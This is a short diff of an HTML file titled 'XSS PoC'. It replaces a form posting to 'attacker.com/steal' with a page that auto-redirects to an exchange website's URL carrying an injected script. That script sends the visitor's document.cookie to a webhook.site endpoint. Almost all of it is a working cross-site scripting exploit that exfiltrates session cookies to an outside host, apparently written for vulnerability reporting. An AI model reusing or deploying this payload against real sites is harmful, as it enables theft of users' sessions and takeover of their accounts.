@@ -1,9 +1,11 @@
+<!doctype html>
 <html>
-<head><script src="https://www.google.com/recaptcha/api.js" async defer></script></head>
-<body>
-<form action="https://attacker.com/steal">
-  <div class="g-recaptcha" data-sitekey="6LFL3SZzNSYPIi0JD8RV47b0MhKvBoiXedtBcoQt"></div>
-  <input type="submit">
-</form>
-</body>
+  <head>
+    <meta charset="utf-8">
+    <title>XSS PoC</title>
+    <meta http-equiv="refresh" content="0; url=https://a2z-swap-app.xrex.exchange/%3B%3Cscript%3Enew%20Image().src%3D'https%3A%2F%2Fwebhook.site%2F7e1604e0-31bf-4dbd-bf90-8e89c6a21ac9%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E%3B/reactjs.org/docs/error-decoder.html?invariant=">
+  </head>
+  <body>
+    Redirecting...
+  </body>
 </html>
